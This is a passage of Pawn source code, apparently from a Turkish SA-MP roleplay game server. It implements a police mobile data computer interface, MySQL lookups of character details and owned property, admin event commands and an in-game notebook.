	PlayerTextDrawTextSize(playerid, PDMDC[playerid][51], 400, 20);

	PDMDC[playerid][52] = CreatePlayerTextDraw(playerid, 134.923629, 266.416687, "Ekip_Kur");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][52], 0.216808, 1.687500);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][52], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][52], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][52], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][52], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][52], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][52], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][52], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][52], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][52], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][52], 190, 20);

	PDMDC[playerid][53] = CreatePlayerTextDraw(playerid, 134.923629, 295.583465, "Kamera");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][53], 0.216808, 1.687500);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][53], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][53], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][53], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][53], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][53], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][53], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][53], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][53], 0);
	PlayerTextDrawSetSelectable(playerid, PDMDC[playerid][53], true);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][53], 190, 20);

	PDMDC[playerid][54] = CreatePlayerTextDraw(playerid, 196.295745, 323.000061, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][54], 0.000000, -0.401170);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][54], 526.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][54], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][54], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][54], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][54], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][54], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][54], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][54], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][54], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][54], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][54], 0);

}

CMD:mdc(playerid)
{
	if(!Girdi[playerid] || (Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != FBI)) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] != LSPD && !Karakter[playerid][isbasi]) return 1;
	if(GetPVarInt(playerid, "MDC") == 0)
	{
		new _name[MAX_PLAYER_NAME+1];
		GetPlayerName(playerid, _name, sizeof(_name));
		strdel(_name, 1, strlen(_name));
		PlayerTextDrawSetString(playerid, PDMDC[playerid][14], _name);
		for(new i=0;i<18;i++)
		{
		    if(i == 17 || i == 15) continue;
		    PlayerTextDrawShow(playerid, PDMDC[playerid][i]);
		}
		SetPVarInt(playerid, "MDCIsim", 2);
		SetPVarInt(playerid, "MDCGirisTimer", SetTimerEx("MDCGiris", 175, true, "u", playerid));
	 	SelectTextDraw(playerid, 0xFFFFFFAA);
	 	SetPVarInt(playerid, "MDC", 1);
	 	Bilgi(playerid, "Taþýnabilir dijital bilgisayar açýldý.");
	}
	else
	{
		for(new i=0;i<55;i++)
		{
		    PlayerTextDrawHide(playerid, PDMDC[playerid][i]);
		}
		CancelSelectTextDraw(playerid);
		SetPVarInt(playerid, "MDC", 0);
		Bilgi(playerid, "Taþýnabilir dijital bilgisayar kapatýldý.");
	}
	return 1;
}

forward MDCGiris(playerid);
public MDCGiris(playerid)
{
	if(GetPVarInt(playerid, "MDC") == 1) {
	    new _name[MAX_PLAYER_NAME+1], _namex[MAX_PLAYER_NAME+1];
		GetPlayerName(playerid, _name, sizeof(_name));
		format(_namex, sizeof(_namex), "%s", _name);
		strdel(_name, GetPVarInt(playerid, "MDCIsim"), strlen(_name));
		if(GetPVarInt(playerid, "MDCIsim")-1 == strlen(_namex))
		{
		    KillTimer(GetPVarInt(playerid, "MDCGirisTimer"));
		    PlayerTextDrawShow(playerid, PDMDC[playerid][15]);
		    SetTimerEx("MDCGirisYapiliyo", 1000, false, "i", playerid);
		}
		else
		{
		    PlayerTextDrawSetString(playerid, PDMDC[playerid][14], _name);
		    SetPVarInt(playerid, "MDCIsim", GetPVarInt(playerid, "MDCIsim")+1);
		}
	}
}

forward MDCGirisYapiliyo(playerid);
public MDCGirisYapiliyo(playerid)
{
    if(GetPVarInt(playerid, "MDC") == 1) {
	    PlayerTextDrawSetString(playerid, PDMDC[playerid][17], "Giris_Yapiliyor..");
	    PlayerTextDrawShow(playerid, PDMDC[playerid][17]);
	    SetTimerEx("MDCGirisYapiliyoEx", 1000, false, "i", playerid);
    }
}

forward MDCGirisYapiliyoEx(playerid);
public MDCGirisYapiliyoEx(playerid)
{
    if(GetPVarInt(playerid, "MDC") == 1) {
	    PlayerTextDrawSetString(playerid, PDMDC[playerid][17], "Giris_Yapildi!");
	    SetTimerEx("MDCAnaMenu", 1000, false, "i", playerid);
    }
}

forward MDCAnaMenu(playerid);
public MDCAnaMenu(playerid)
{
    for(new i=0;i<18;i++)
	{
		if(i == 0 || 4 <= i <= 7 || i == 16) continue;
	    PlayerTextDrawHide(playerid, PDMDC[playerid][i]);
	}
	new mstring[128];
	new _rutbe[64];
	format(_rutbe, 64, "%s", RutbesiniVer(playerid));
	strreplace(_rutbe, "ü", "u");
	strreplace(_rutbe, "Ü", "U");
	strreplace(_rutbe, "ö", "o");
	strreplace(_rutbe, "Ö", "O");
	strreplace(_rutbe, "ý", "i");
	strreplace(_rutbe, "Ý", "I");
	strreplace(_rutbe, "ð", "g");
	strreplace(_rutbe, "Ð", "G");
	strreplace(_rutbe, "þ", "s");
	strreplace(_rutbe, "Þ", "S");
	strreplace(_rutbe, "ç", "c");
	strreplace(_rutbe, "Ç", "C");
	format(mstring, sizeof(mstring), "Ad_:_%s", Isim(playerid));
	PlayerTextDrawSetString(playerid, PDMDC[playerid][24], mstring);
	format(mstring, sizeof(mstring), "Rutbe_:_%s", _rutbe);
	PlayerTextDrawSetString(playerid, PDMDC[playerid][28], mstring);
	format(mstring, sizeof(mstring), "Rozet_No_:_%d", Karakter[playerid][rozetno]);
	PlayerTextDrawSetString(playerid, PDMDC[playerid][29], mstring);
    for(new i=18;i<30;i++)
	{
	    PlayerTextDrawShow(playerid, PDMDC[playerid][i]);
	}
	PlayerTextDrawShow(playerid, PDMDC[playerid][52]);
	PlayerTextDrawShow(playerid, PDMDC[playerid][53]);
}

MDCOyuncuGoster(playerid, _name[])
{
    foreach(new i : Player)
	{
	    if(Buysa(Isim(i),_name))
	    {
	        for(new ix=0;ix<55;ix++)
			{
				if(ix == 0 || 4 <= ix <= 7 || ix == 16 || 18 <= ix <= 23 || ix == 25 || ix == 26 || 52 <= ix <= 53) continue;
				PlayerTextDrawHide(playerid, PDMDC[playerid][ix]);
			}
			PlayerTextDrawSetPreviewModel(playerid, PDMDC[playerid][44], GetPlayerSkin(i));
			new mstring[512],cins[6],tenrengi[7],_boytext[12],_kilotext[10],_grenktext[12],_srenktext[12];
			switch(Karakter[i][cinsiyet])
			{
			    case 1: format(cins, sizeof(cins), "Erkek");
			    case 2: format(cins, sizeof(cins), "Kadin");
			}
			switch(Karakter[i][uyruk])
			{
			    case 1: format(tenrengi, sizeof(tenrengi), "Siyahi");
			    case 2: format(tenrengi, sizeof(tenrengi), "Beyaz");
			}
			switch(Karakter[i][boy])
			{
			    case 1: _boytext = "1.50-1.60m";
			    case 2: _boytext = "1.61-1.70m";
			    case 3: _boytext = "1.71-1.76m";
			    case 4: _boytext = "1.77-1.85m";
			    case 5: _boytext = "+1.85m";
			}
			switch(Karakter[i][kilo])
			{
			    case 1: _kilotext = "40-50kg";
			    case 2: _kilotext = "51-60kg";
			    case 3: _kilotext = "61-65kg";
			    case 4: _kilotext = "66-75kg";
			    case 5: _kilotext = "76-85kg";
		     	case 6: _kilotext = "85-90kg";
		     	case 7: _kilotext = "91-100kg";
		     	case 8: _kilotext = "101-120kg";
		     	case 9: _kilotext = "+120kg";
			}
			switch(Karakter[i][gozrenk])
			{
			    case 1: _grenktext = "Siyah";
			    case 2: _grenktext = "Kahverengi";
			    case 3: _grenktext = "Mavi";
			    case 4: _grenktext = "Yesil";
			    case 5: _grenktext = "Diger";
			}
			switch(Karakter[i][sacrenk])
			{
			    case 1: _srenktext = "Kel";
			    case 2: _srenktext = "Siyah";
			    case 3: _srenktext = "Kahverengi";
			    case 4: _srenktext = "Kumral";
			    case 5: _srenktext = "Sari";
			    case 6: _srenktext = "Kizil";
			    case 7: _srenktext = "Diger";
			}
			new aracsayi=0, evsayi=0, isyerisayi=0;
			foreach(new ix : Houses) {
				if(Ev[ix][esahip] == Karakter[i][sqlid]) evsayi++;
			}
			foreach(new ix : Business) {
				if(Isyeri[ix][isahip] == Karakter[i][sqlid]) isyerisayi++;
			}
			for(new ix=0;ix<MAX_VEHICLES;ix++) {
				if(Arac[ix][aowner] == Karakter[i][sqlid]) aracsayi++;
			}
			format(mstring, sizeof(mstring), "%s__-_Yas:%d_-_Cinsiyet:%s_-_Irk:%s_-_Tel:%d",Isim(i),Karakter[i][yas],cins,tenrengi,Karakter[i][telno]);
			PlayerTextDrawSetString(playerid, PDMDC[playerid][30], mstring);
			format(mstring, sizeof(mstring), "GozRengi:%s_-_SacRengi:%s_-_Boy:%s_-_Kilo:%s",_grenktext,_srenktext,_boytext,_kilotext);
			PlayerTextDrawSetString(playerid, PDMDC[playerid][31], mstring);
			format(mstring, sizeof(mstring), "Ev(%d)",evsayi);
			PlayerTextDrawSetString(playerid, PDMDC[playerid][32], mstring);
			format(mstring, sizeof(mstring), "Isyeri(%d)",isyerisayi);
			PlayerTextDrawSetString(playerid, PDMDC[playerid][35], mstring);
			format(mstring, sizeof(mstring), "Arac(%d)",aracsayi);
			PlayerTextDrawSetString(playerid, PDMDC[playerid][36], mstring);
			format(mstring, sizeof(mstring), "");
			foreach(new ix : Houses) {
				if(Ev[ix][esahip] == Karakter[i][sqlid]) format(mstring, sizeof(mstring), "%s~n~Ev_Adres:_%s_%d",mstring,GetLocation(Ev[ix][girisX],Ev[ix][girisY],Ev[ix][girisZ]),ix);
			}
			PlayerTextDrawSetString(playerid, PDMDC[playerid][37], mstring);
			format(mstring, sizeof(mstring), "");
			foreach(new ix : Business) {
				if(Isyeri[ix][isahip] == Karakter[i][sqlid]) format(mstring, sizeof(mstring), "%s~n~Isyeri_Adres:_%s_%d",mstring,GetLocation(Isyeri[ix][girisX],Isyeri[ix][girisY],Isyeri[ix][girisZ]),ix);
			}
			PlayerTextDrawSetString(playerid, PDMDC[playerid][38], mstring);
			format(mstring, sizeof(mstring), "");
			for(new ix=0;ix<MAX_VEHICLES;ix++) {
				if(Arac[ix][aowner] == Karakter[i][sqlid]) format(mstring, sizeof(mstring), "%s~n~Arac_Plaka:_%s",mstring,Arac[ix][aplaka]);
			}
			PlayerTextDrawSetString(playerid, PDMDC[playerid][39], mstring);
			for(new ix=30;ix<40;ix++) {
				PlayerTextDrawShow(playerid, PDMDC[playerid][ix]);
			}
			PlayerTextDrawShow(playerid, PDMDC[playerid][44]);
			PlayerTextDrawShow(playerid, PDMDC[playerid][49]);
			PlayerTextDrawShow(playerid, PDMDC[playerid][50]);
			PlayerTextDrawShow(playerid, PDMDC[playerid][51]);
			PlayerTextDrawShow(playerid, PDMDC[playerid][54]);
	        return 1;
	    }
	}
	new _sqlid = IsimKontrol(_name);
	if(_sqlid == 0) return Hata(playerid, "Bu isimde oyuncu bulunmamaktadýr.");
	for(new ix=0;ix<55;ix++)
	{
		if(ix == 0 || 4 <= ix <= 7 || ix == 16 || 18 <= ix <= 23 || ix == 25 || ix == 26 || 52 <= ix <= 53) continue;
		PlayerTextDrawHide(playerid, PDMDC[playerid][ix]);
	}
	PlayerTextDrawSetPreviewModel(playerid, PDMDC[playerid][44], SQLSkin(_sqlid));
	new mstring[512],cins[6],tenrengi[7],_boytext[12],_kilotext[10],_grenktext[12],_srenktext[12];
	switch(SQLCinsiyet(_sqlid))
	{
		case 1: format(cins, sizeof(cins), "Erkek");
		case 2: format(cins, sizeof(cins), "Kadin");
	}
	switch(SQLUyruk(_sqlid))
	{
	    case 1: format(tenrengi, sizeof(tenrengi), "Siyahi");
	    case 2: format(tenrengi, sizeof(tenrengi), "Beyaz");
	}
	switch(SQLBoy(_sqlid))
	{
	    case 1: _boytext = "1.50-1.60m";
	    case 2: _boytext = "1.61-1.70m";
	    case 3: _boytext = "1.71-1.76m";
	    case 4: _boytext = "1.77-1.85m";
	    case 5: _boytext = "+1.85m";
	}
	switch(SQLKilo(_sqlid))
	{
	    case 1: _kilotext = "40-50kg";
	    case 2: _kilotext = "51-60kg";
	    case 3: _kilotext = "61-65kg";
	    case 4: _kilotext = "66-75kg";
	    case 5: _kilotext = "76-85kg";
	   	case 6: _kilotext = "85-90kg";
	   	case 7: _kilotext = "91-100kg";
	  	case 8: _kilotext = "101-120kg";
	   	case 9: _kilotext = "+120kg";
	}
	switch(SQLGozRenk(_sqlid))
	{
	    case 1: _grenktext = "Siyah";
	    case 2: _grenktext = "Kahverengi";
	    case 3: _grenktext = "Mavi";
	    case 4: _grenktext = "Yesil";
	    case 5: _grenktext = "Diger";
	}
	switch(SQLSacRenk(_sqlid))
	{
	    case 1: _srenktext = "Kel";
	    case 2: _srenktext = "Siyah";
	    case 3: _srenktext = "Kahverengi";
	    case 4: _srenktext = "Kumral";
	    case 5: _srenktext = "Sari";
	    case 6: _srenktext = "Kizil";
	    case 7: _srenktext = "Diger";
	}
	format(mstring, sizeof(mstring), "%s__-_Yas:%d_-_Cinsiyet:%s_-_Irk:%s_-_Tel:%d",_name,SQLYas(_sqlid),cins,tenrengi,SQLTelNo(_sqlid));
	PlayerTextDrawSetString(playerid, PDMDC[playerid][30], mstring);
	format(mstring, sizeof(mstring), "GozRengi:%s_-_SacRengi:%s_-_Boy:%s_-_Kilo:%s",_grenktext,_srenktext,_boytext,_kilotext);
	PlayerTextDrawSetString(playerid, PDMDC[playerid][31], mstring);
	format(mstring, sizeof(mstring), "Ev(%d)",SQLEvlerim(_sqlid));
	PlayerTextDrawSetString(playerid, PDMDC[playerid][32], mstring);
	format(mstring, sizeof(mstring), "Isyeri(%d)",SQLIsyerlerim(_sqlid));
	PlayerTextDrawSetString(playerid, PDMDC[playerid][35], mstring);
	format(mstring, sizeof(mstring), "Arac(%d)",SQLAracSay(_sqlid));
	PlayerTextDrawSetString(playerid, PDMDC[playerid][36], mstring);
	format(mstring, sizeof(mstring), "");
	foreach(new ix : Houses) {
		if(Ev[ix][esahip] == _sqlid) format(mstring, sizeof(mstring), "%s~n~Ev_Adres:_%s_%d",mstring,GetLocation(Ev[ix][girisX],Ev[ix][girisY],Ev[ix][girisZ]),ix);
	}
	PlayerTextDrawSetString(playerid, PDMDC[playerid][37], mstring);
	format(mstring, sizeof(mstring), "");
	foreach(new ix : Business) {
		if(Isyeri[ix][isahip] == _sqlid) format(mstring, sizeof(mstring), "%s~n~Isyeri_Adres:_%s_%d",mstring,GetLocation(Isyeri[ix][girisX],Isyeri[ix][girisY],Isyeri[ix][girisZ]),ix);
	}
	PlayerTextDrawSetString(playerid, PDMDC[playerid][38], mstring);
	format(mstring, sizeof(mstring), "");
	for(new ix=0;ix<MAX_VEHICLES;ix++) {
		if(Arac[ix][aowner] == _sqlid)
		{
			format(mstring, sizeof(mstring), "%s~n~Arac_Plaka:_%s",mstring,Arac[ix][aplaka]);
		}
	}
	PlayerTextDrawSetString(playerid, PDMDC[playerid][39], mstring);
	for(new ix=30;ix<40;ix++) {
		PlayerTextDrawShow(playerid, PDMDC[playerid][ix]);
	}
	PlayerTextDrawShow(playerid, PDMDC[playerid][44]);
	PlayerTextDrawShow(playerid, PDMDC[playerid][49]);
	PlayerTextDrawShow(playerid, PDMDC[playerid][50]);
	PlayerTextDrawShow(playerid, PDMDC[playerid][51]);
	PlayerTextDrawShow(playerid, PDMDC[playerid][54]);
	return 1;
}

SQLSkin(_sqlid) {
	new _result,query[128];
	format(query, sizeof(query), "SELECT `skin` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLCinsiyet(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `cinsiyet` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLUyruk(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `uyruk` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLBoy(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `boy` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLKilo(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `kilo` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLGozRenk(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `gozrenk` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLSacRenk(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `sacrenk` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLYas(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `yas` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLTelNo(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT `telno` FROM `karakterler` WHERE `id` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

TelNoBulEx(_string[]){
    new _result,query[128];
	format(query, sizeof(query), "SELECT `telno` FROM `karakterler` WHERE `isim` = '%s';",_string);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLEvlerim(_sqlid){
	new _result,query[128];
	format(query, sizeof(query),"SELECT COUNT(*) FROM `evler` WHERE `esahip` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLIsyerlerim(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT COUNT(*) FROM `isyerleri` WHERE `isahip` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

SQLAracSay(_sqlid){
	new _result,query[128];
	format(query, sizeof(query), "SELECT COUNT(*) FROM `araclar` WHERE `owner` = '%d';",_sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

CMD:aevent(playerid)
{
    format(event,sizeof(event),"Event Silahlar (%d,%d,%d)\n",eweaps[0],eweaps[1],eweaps[2]);
	format(event,sizeof(event),"%sEvent Oyuncu Can (%d)\n",event,ehealth);
	format(event,sizeof(event),"%sEvent Oyuncu Zýrh (%d)\n",event,earmour);
	format(event,sizeof(event),"%sEvent Araç (%d)\n",event,eveh);
	format(event,sizeof(event),"%sEvent Pozisyon (%f,%f,%f)\n",event,xx,yy,zz);
	format(event,sizeof(event),"%sEvent Kilit (%d)\n",event,elock);
	format(event,sizeof(event),"%sEvent Baþladý (%d)\n",event,estart);
	format(event,sizeof(event),"%sEvent Duyur (%d)\n",event,eannounce);
	format(event,sizeof(event),"%sKatýlan Oyuncular\n",event);
	format(event,sizeof(event),"%sEvent Bitir\n",event);
	format(event,sizeof(event),"%sEvent Oyuncularý Dondur",event);
	if(!AKontrol(playerid)) return Hata(playerid,"Bu komutu kullanamazsýnýz.");
    ShowPlayerDialog(playerid, 405,DIALOG_STYLE_LIST,"Event Ayarlarý",event,"Seç","Ýptal");
    return 1;
}

CMD:ekatil(playerid)
{
	if(estart != 1) return Hata(playerid,"Aktif bir event bulunmamaktadýr.");

	if(elock != 1 && join[playerid] == 0)
	{
		join[playerid] = 1;
		new Float:pPos[4];
		GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
		GetPlayerFacingAngle(playerid, pPos[3]);
		SetPVarFloat(playerid, "ePosX", pPos[0]);
		SetPVarFloat(playerid, "ePosY", pPos[1]);
		SetPVarFloat(playerid, "ePosZ", pPos[2]);
		SetPVarFloat(playerid, "ePosAngle", pPos[3]);
		SetPVarInt(playerid, "ePosInt", GetPlayerInterior(playerid));
		SetPVarInt(playerid, "ePosVw", GetPlayerVirtualWorld(playerid));
		Bilgi(playerid,"Evente katýldýnýz, event baþlayýnca ýþýnlanýcaksýnýz.");
	}
	else if(elock == 1)
	{
  		Hata(playerid,"Evente giriþler kapatýlmýþ.");
	}
	return 1;
}

forward GiveVehicle(playerid,vehicleid);
forward GiveVehicle2(playerid);
public GiveVehicle(playerid,vehicleid)
{
    if(!IsPlayerInAnyVehicle(playerid))
    {
        new Float:x, Float:y, Float:z, Float:angle;
        GetPlayerPos(playerid, x, y, z);
        GetPlayerFacingAngle(playerid, angle);
        new veh = CreateVehicle(vehicleid, x, y, z, angle, -1, -1, -1);
        SetVehicleVirtualWorld(veh, GetPlayerVirtualWorld(playerid));
        LinkVehicleToInterior(veh, GetPlayerInterior(playerid));
        PutPlayerInVehicle(playerid, veh, 0);
    }
    return 1;
}

public GiveVehicle2(playerid)
{
    GiveVehicle(playerid,eveh);
    return 1;
}

GetFreeAttachedObjectIndexEx(playerid)
{
	new slot = -1;
	for(new i=6; i<=9; i++)
    {
        if(!IsPlayerAttachedObjectSlotUsed(playerid, i))
        {
            slot = i;
            break;
        }
    }
    return slot;
}

CMD:reklamkapat(playerid)
{
	if(!Girdi[playerid]) return 1;
	switch(gReklamKapa[playerid])
	{
	    case 0:
		{
		    Bilgi(playerid, "Artýk reklam yazýlarýný görmeyeceksiniz.");
		    gReklamKapa[playerid] = true;
		}
		case 1:
		{
		    Bilgi(playerid, "Artýk reklam yazýlarýný görüceksiniz.");
		    gReklamKapa[playerid] = false;
		}
	}
	return 1;
}

CMD:dilyardim(playerid)
{
	if(!Girdi[playerid]) return 1;
	new mstring[2048];
 	format(mstring, sizeof(mstring), "%s\n"C1"Almanca \t\t"C2"(/alm)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Arapça \t\t"C2"(/arp)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Çince \t\t\t"C2"(/cin)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Fransýzca \t\t"C2"(/fra)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Ýspanyolca \t\t"C2"(/isp)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Ýtalyanca \t\t"C2"(/ita)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Japonca \t\t"C2"(/jap)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Rusça \t\t\t"C2"(/rus)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Ýbranice \t\t"C2"(/ibr)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Yunanca \t\t"C2"(/yun)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Ermenice \t\t"C2"(/erm)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Slovakça \t\t"C2"(/slo)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Portekizce \t\t"C2"(/por)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Sýrpça \t\t\t"C2"(/sir)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Almanca \t\t"C2"(/alm)",mstring);
	format(mstring, sizeof(mstring), "%s\n"C1"Arnavutça \t\t"C2"(/arn)",mstring);
	ShowPlayerDialog(playerid, 297, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Dil Yardým", mstring, "Kapat", "");
	return 1;
}

/*BankaSaat()
{
	new _hour,_minuite,_second;
	gettime(_hour,_minuite,_second);
	#pragma unused _minuite
	#pragma unused _second
	if(21 >= _hour >= 11) return 1;
	return 0;
}*/

CMD:notdefteri(playerid)
{
	if(!Girdi[playerid]) return 1;
	if(!Karakter[playerid][notdefteri]) return Hata(playerid, "Not defteriniz bulunmamaktadýr.");
	ShowPlayerDialog(playerid, 418, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Not Defteri", ""C3""NOKTA"\t "C1"Yeni Not Yaz\n"C3""NOKTA"\t "C1"Notlarým", "Seç", "Ýptal");
	return 1;
}

NotSayfa(playerid)
{
	new _result,query[128];
	format(query, sizeof(query), "SELECT `sayfa` FROM `notdefteri` WHERE `sqlid` = '%d';",Karakter[playerid][sqlid]);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_count();
	cache_delete(result);
	return _result;
}

GarajMapIconEkle(playerid)
{
    new iconid=1;
    foreach(new i : Business)
    {
        if(Isyeri[i][itip] == 15 && Isyeri[i][girisX] != 0) {
            SetPlayerMapIcon(playerid, 80-iconid, Isyeri[i][girisX], Isyeri[i][girisY], Isyeri[i][girisZ], 27, 0, MAPICON_LOCAL);
            iconid++;
        }
    }
}

NotEkle(playerid, string[])
{
	new _string[1000];
	format(_string, sizeof(_string), "%s", EscapeString(string));
	new _nsayfa = NotSayfa(playerid);
	new query[2048];
	if(_nsayfa != 0)
	{
		new _result[645];
		format(query, sizeof(query), "SELECT `not` FROM `notdefteri` WHERE `sqlid` = '%d' AND `sayfa` = '%d';",Karakter[playerid][sqlid],_nsayfa);
		new Cache:result = mysql_query(query,true);
		cache_get_row(0, 0, _result);
		cache_delete(result);
		if(NotSayi(playerid, _nsayfa) != 5)
		{
			format(_result, sizeof(_result), "%s|%s",_result,string);
			format(_string, sizeof(_string), "%s", EscapeString(_result));
			format(query, sizeof(query), "UPDATE `notdefteri` SET `not` = '%s' WHERE `sqlid` = '%d' AND `sayfa` = '%d';",_string,Karakter[playerid][sqlid],_nsayfa);
			mysql_tquery(1,query);
		}
		else
		{
		    format(query, sizeof(query), "INSERT INTO `notdefteri` (`not`,`sqlid`,`sayfa`) VALUES ('%s','%d','%d')",_string,Karakter[playerid][sqlid],_nsayfa+1);
			mysql_tquery(1,query);
		}
	}
	else
	{
	    format(query, sizeof(query), "INSERT INTO `notdefteri` (`not`,`sqlid`,`sayfa`) VALUES ('%s','%d','%d')",_string,Karakter[playerid][sqlid],1);
		mysql_tquery(1,query);
	}
}

NotSayi(playerid, sayfa)
{
	new _result[645],query[128];
	format(query, sizeof(query), "SELECT `not` FROM `notdefteri` WHERE `sqlid` = '%d' AND `sayfa` = '%d';",Karakter[playerid][sqlid],sayfa);
	new Cache:result = mysql_query(query,true);
	cache_get_row(0, 0, _result);
	cache_delete(result);
	new _result2 = strcount(_result, "|");
	return _result2+1;
}

NotSayfaGoster(playerid, sayfa)
{
	new _result[645],query[128];
	format(query, sizeof(query), "SELECT `not` FROM `notdefteri` WHERE `sqlid` = '%d' AND `sayfa` = '%d';",Karakter[playerid][sqlid],sayfa);
	new Cache:result = mysql_query(query,true);
	cache_get_row(0, 0, _result);
	cache_delete(result);
	new mstring[1024];
	format(mstring, sizeof(mstring), ""C3"NOT DEFTERÝ\n\n\n");
	new __xbol[5][128];
	strexplode(__xbol, _result, "|");
	for(new i=0;i<5;i++)
	{
		if(!isnull(__xbol[i]))
		{
			format(mstring, sizeof(mstring), "%s"C3""NOKTA" "C1"%s\n",mstring,__xbol[i]);
		}
	}
	SetPVarInt(playerid, "gNotSayfa", sayfa);
	if(sayfa == 1) ShowPlayerDialog(playerid, 420, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Not Defteri", mstring, "Kapat", "Diðer Sayfa");
	else if(NotSayfa(playerid) == sayfa) ShowPlayerDialog(playerid, 421, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Not Defteri", mstring, "Kapat", "Önceki Sayfa");
	else ShowPlayerDialog(playerid, 421, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Not Defteri", mstring, "Önceki Sayfa", "Diðer Sayfa");
}

CMD:mark(playerid)
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 1) return 1;
	if(markPos[playerid][0] == 0 && markPos[playerid][1] == 0 && markPos[playerid][2] == 0)
	{
